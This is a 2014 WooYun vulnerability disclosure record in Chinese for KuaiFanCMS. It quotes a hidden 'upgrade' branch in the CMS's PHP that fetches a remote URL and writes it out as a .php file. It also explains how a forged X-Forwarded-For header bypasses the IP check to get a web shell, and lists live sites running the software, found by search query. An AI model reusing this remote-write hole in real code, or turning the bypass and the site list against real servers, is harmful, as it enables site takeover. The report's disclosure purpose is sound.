{"id": 51347, "wybug_id": "wooyun-2014-074873", "wybug_title": "KuaiFanCMS 手机建站系统前台getshell（demo沦陷）", "wybug_corp": "kuaifan.net", "wybug_author": "存在敏感词", "wybug_date": "2014-09-03 16:09", "wybug_open_date": "2014-11-29 16:10", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "远程文件下载"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-08：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-29：\t细节向公众公开  简要描述： KuaiFanCMS 手机建站系统前台getshell（demo沦陷） 详细说明：  问题出在 include/libs/sysplugins/smarty_internal_data.php的第425行\nif ($_GET['upsmarty'] == \"upgrade\") {\tif (defined('KF_INC_PATH')){\t\trequire(KF_INC_PATH.'/libs/classes/cdn.ip.php');\t\t$_onip = gethostbyname(base64_decode('d2FwLmt1YWlmYW4ubmV0'));\t\tif ($online_ip == $_onip || cdn_get_ip() == $_onip){\t\t\t$_html = file_get_contents($_GET['html_url']);\t\t\t$_html = mb_convert_encoding( $_html, 'UTF-8', 'UTF-8,GBK,GB2312,BIG5' );\t\t\tif (!file_put_contents(KF_ROOT_PATH.md5($timestamp).\".php\", $_html, LOCK_EX)){\t\t\t\t$fp = @fopen(KF_ROOT_PATH.md5($timestamp).\".php\", 'wb+');\t\t\t\tif (!$fp) exit('-1');\t\t\t\tif (!@fwrite($fp, trim($_html))) exit('-1');\t\t\t\t@fclose($fp);\t\t\t} exit(md5($timestamp));\t\t}\t}}\n 从这里可以看出$_onip是从一个域名获得的，经过base64解码，这个域名是demo站的域名。如果cdn_get_ip() == $_onip，就可以远程下载文件并存为本地的php，连文件名都返回了=。= 看cdn_get_ip()这个函数 在/libs/classes/cdn.ip.php中\nfunction cdn_get_ip(){    static $ip = NULL;    if($ip !== NULL){        return $ip;    }    if(isset($_SERVER))        {        if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){            $arr = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);            foreach ($arr AS $ip){                $ip = trim($ip);                if($ip != 'unknown'){                    $ip = $ip;                    break;                }            }        }elseif(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){            $arr = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);            foreach ($arr AS $ip){                $ip = trim($ip);                if($ip != 'unknown'){                    $ip = $ip;                    break;                }            }        }elseif(isset($_SERVER['HTTP_CLIENT_IP'])){            $ip = $_SERVER['HTTP_CLIENT_IP'];        }else{            if(isset($_SERVER['REMOTE_ADDR'])){                $ip = $_SERVER['REMOTE_ADDR'];            }else{                $ip = '0.0.0.0';            }        }    }else{        if(getenv('HTTP_X_FORWARDED_FOR')){            $ip = getenv('HTTP_X_FORWARDED_FOR');        }elseif(getenv('HTTP_CLIENT_IP')){            $ip = getenv('HTTP_CLIENT_IP');        }else{            $ip = getenv('REMOTE_ADDR');        }    }    preg_match(\"/[\\d\\.]{7,15}/\", $ip, $onlineip);    $ip = !empty($onlineip[0]) ? $onlineip[0] : '0.0.0.0';    return $ip;}\n可以看出ip是可以用x forward for伪造的。 所以，可以伪造ip然后getshell。   漏洞证明：  google inurl:index.php?m=huiyuan能找到很多使用这个程序的网站。举例：http://wap818.com/http://3tel.cn/http://www.g3ey.com/http://h4747.cn/http://i.douguan.cn/http://nxh19950805.com/http://menghuan.asia/\n\n官网demo shell\n\n   修复方案：  做好ip判断   版权声明：转载请注明来源 存在敏感词@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-11-29 16:10 厂商回复：  最新状态： 2014-09-09：正在处理 2014-09-09：已经修复  ", "replys": "漏洞评价：\n评论\n     2015-04-01 02:58 |    \t\tMxx \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 没有)\t\t \n  虽然没看懂，但是有用。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}